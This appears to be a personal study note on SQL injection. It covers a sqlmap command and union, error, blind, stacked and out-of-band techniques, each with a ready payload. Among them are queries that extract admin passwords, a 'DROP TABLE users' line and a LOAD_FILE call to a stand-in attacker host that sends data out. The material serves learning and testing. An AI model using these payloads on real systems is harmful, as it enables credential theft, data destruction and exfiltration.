# SqlI

## WriteUps

[Tricks](https://www.notion.so/Tricks-24078b2152854f11896181383e961288?pvs=21)

[Portswigger](https://www.notion.so/Portswigger-1e21202e068540619f1f1b0c3802be0a?pvs=21)

**@Mysql**

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

[Information\_schema](https://www.notion.so/Information\_schema-79ab4c7abc2a4892beb49e4c58fc31a8?pvs=21)

## How use Sqlmap

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap -r req.txt --dbs --random-agent --risk 3 --level 5
```

## How SQL Injection Works

At its core, SQLi exploits vulnerabilities in the input validation framework of an application.

When user inputs are not properly sanitized, an attacker can inject malicious SQL queries that the application will execute without question.

This can result in unauthorized access to sensitive information, data manipulation, and even complete control over the database.

### 1. Detection of SQL Injection Vulnerabilities

#### **Reconnaissance** => backend Use + DBMS

Detecting SQL Injection vulnerabilities involves testing for unexpected or unhandled inputs.

Techniques such as submitting single quotes (<mark style="color:red;">`'`</mark>), double quotes (<mark style="color:red;">`"`</mark>), or other SQL control characters can reveal how an application processes input.

Observing error messages or application responses can provide clues about the underlying SQL query structure, indicating potential injection points.

### Entry Point Detection Examples:

* **Confirming with Logical Operations:** Using statements like <mark style="color:red;">**`1' OR '1'='1`**</mark> can help determine if an application is vulnerable by altering the query logic.
* **Timing Attacks:** Introducing deliberate delays (`SLEEP` functions) in queries can help identify blind SQL Injection vulnerabilities by observing response times.

### 2. Exploiting SQL Injection

Once a vulnerability is identified, exploiting it can take various forms depending on the database and the nature of the vulnerability:

> A. _**Union Based SQL Injection:**_

_**Identifying the Number of Columns:**_

Both <mark style="color:red;">**`ORDER BY`**</mark> and <mark style="color:red;">`GROUP BY`</mark> can be exploited to identify the number of columns in the query's result set. This is crucial for constructing a successful <mark style="color:red;">**`UNION SELECT`**</mark> attacks.

**Scenario:** You’ve identified a page that displays user details based on their ID from the URL parameter `?id=1`.

_**Vulnerable SQL Query:**_

```sql
SELECT name, age FROM users WHERE id = $_GET['id'];
```

_**Exploitation**_**:**

```sql
?id=1 UNION SELECT username, password FROM admin_users
```

In this example, the attacker appends a `UNION SELECT` query to retrieve usernames and passwords from an `admin_users` table, bypassing the intended query's limitations.

> B. Error-Based SQL Injection:

It involves generating database errors to extract information from the error messages.

**Scenario:** An application displays detailed error messages when SQL queries fail.

_**Vulnerable SQL Query:**_

```sql
SELECT title, content FROM articles WHERE id = $_GET['id'];
```

_**Exploitation:**_

```sql
?id=1 AND (SELECT COUNT(*) FROM admin_users) = CAST('' AS INTEGER)
```

This payload causes a type conversion error, potentially revealing information about the database structure or data through error messages.

> C. Blind SQL Injection:

No data is transferred from the web application to the attacker, so the attacker sends data to the database, true or false questions, and observes the response.

**Scenario:** The application does not display error messages or query results, but changes in response can be observed.

_**Boolean-Based Exploitation:**_

```sql
?id=1 AND (SELECT SUBSTRING(password, 1, 1) FROM admin_users WHERE username = 'admin') = 'a'
```

This method involves iteratively guessing the password character by character, and observing the application’s behavior (e.g., response time or content changes) to confirm the guess.

_**Time-Based Exploitation:**_

```sql
?id=1 AND IF((SELECT SUBSTRING(password, 1, 1) FROM admin_users WHERE username = 'admin') = 'a', sleep(5), 'false')
```

This payload uses a conditional time delay to confirm the password character, exploiting the database’s response time.

> D. Stacked Queries SQL Injection

**Key Detail:** The database and interface must support multiple queries executed in a single database call.

**Example:**

```
?id=1; DROP TABLE users --
```

Stacked queries allow an attacker to execute additional queries after the initial, legitimate query. This is highly dependent on the database and the programming language’s database driver or ORM the application uses.

> E. Out-of-Band (OOB) SQL Injection

**Key Detail:** The database server must be able to make DNS or HTTP requests to external servers.

**Example:**

```
?id=1; SELECT LOAD_FILE('\\\\\\\\attacker-controlled-server.com\\\\data')
```

OOB techniques rely on the database server’s ability to communicate with external systems, allowing data exfiltration via DNS queries or HTTP requests.

> F. Advanced SQL Injection Techniques

* **Authentication Bypass:** Attackers might inject SQL to bypass login algorithms, often targeting the query logic.**Mitigation:** Employ strong input validation and parameterized queries for authentication mechanisms.
* **Inferential SQL Injection:** Similar to Blind SQLi, this method involves making logical guesses about the data structure and content.**Mitigation:** Use WAFs and ensure applications do not reveal any hints in their responses.
* **Second Order SQL Injection:** Occurs when user input is stored and later executed as a SQL query.**Mitigation:** Always sanitize user inputs, even when they are not immediately used in database queries.
